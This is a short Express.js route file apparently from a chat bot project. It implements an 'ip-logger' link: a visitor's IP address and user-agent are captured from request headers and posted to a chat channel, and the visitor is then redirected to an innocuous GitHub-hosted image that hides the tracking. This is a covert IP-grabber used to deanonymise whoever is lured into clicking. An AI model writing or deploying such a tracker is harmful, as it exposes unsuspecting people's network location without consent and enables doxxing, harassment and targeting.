import express from 'express';
import { ipLoggerService } from '../client/features/ip-logger-service';

const featuresRouter = express.Router();

featuresRouter.get('/ip-logger/:id', (req, res) => {
  console.log(req.headers);

  const id = req.params.id;
  const ip = (
    req.ip ??
    req.headers['x-forwarded-for']?.toString() ??
    req.connection?.remoteAddress ??
    ''
  )
    .split(',')[0]
    .trim()
    .replace(/^.*:/, '');

  const userAgent = req.headers['user-agent'] || 'Unknown';

  const channel = ipLoggerService.getChannel(id);

  if (channel) {
    channel.sendChat(`IP: ${ip}\nUser-Agent: ${userAgent}`);
  }

  res.redirect(
    'https://github.com/user-attachments/assets/2d54d27d-dc4b-49c3-807a-7c6bce3023a6'
  );
});

export { featuresRouter };
